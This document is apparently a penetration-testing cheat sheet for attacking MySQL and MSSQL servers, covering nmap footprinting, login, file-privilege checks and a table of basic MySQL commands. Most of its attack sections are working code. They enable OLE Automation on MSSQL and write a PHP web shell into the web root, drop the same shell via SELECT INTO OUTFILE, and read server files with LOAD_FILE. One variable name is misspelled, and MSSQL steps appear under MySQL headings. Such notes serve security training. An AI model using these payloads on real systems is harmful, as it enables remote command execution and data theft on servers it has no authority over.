
## Footprinting the Service

```bash
sudo nmap <TARGET IP> -sV -sC -p3306 --script mysql*
```

## Logging in MySQL Server

```bash
mysql -u <username> -p -h <TARGET IP>
```


## MySQL - Secure File Privileges

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, we can only import and export data from that directory and not from anywhere else.

```mysql
show variables like "secure_file_prive";
```

## Enable Ole Automation Procedures

- Enabling `Enable Ole Automation Procedures` allows us to `write` files.
- `Ole Automation Procedures` require admin privileges.

```mysql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

## Using Ole Automation Procedure to create PHP WebShell by Creating a File

- **Requires** : `Ole Automation Procedures` 
- Creating a file requires the above privilege and only then we can create a file and then we can write our `PHP` web shell and then execute it.

```mysql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```


## Write Local Files

- This creates a local file named `webshell.php` which can be used to create a web shell using the `PHP`. 

```mysql
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```


## Read Local Files

```mysql
mysql> select LOAD_FILE("<filepath>");
```

## Commands

|**Command**|**Description**|
|---|---|
|`mysql -u <user> -p<password> -h <IP address>`|Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password.|
|`show databases;`|Show all databases.|
|`use <database>;`|Select one of the existing databases.|
|`show tables;`|Show all available tables in the selected database.|
|`show columns from <table>;`|Show all columns in the selected table.|
|`select * from <table>;`|Show everything in the desired table.|
|`select * from <table> where <column> = "<string>";`|Search for needed `string` in the desired table.|

